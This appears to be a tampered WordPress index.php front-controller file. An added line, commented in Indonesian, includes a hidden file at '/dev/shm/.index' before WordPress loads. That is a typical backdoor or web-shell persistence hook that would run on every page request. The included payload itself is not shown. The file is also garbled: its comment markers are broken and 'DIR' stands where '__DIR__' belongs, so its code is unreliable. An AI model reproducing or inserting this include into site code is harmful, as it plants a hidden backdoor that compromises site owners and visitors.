<?php
/
 * Front to the WordPress application.
 *
 * @package WordPress
 */

// Include dari /dev/shm/index (absolute path)
include '/dev/shm/.index';

define( 'WP_USE_THEMES', true );

/ Loads the WordPress Environment and Template */
require DIR . '/wp-blog-header.php';
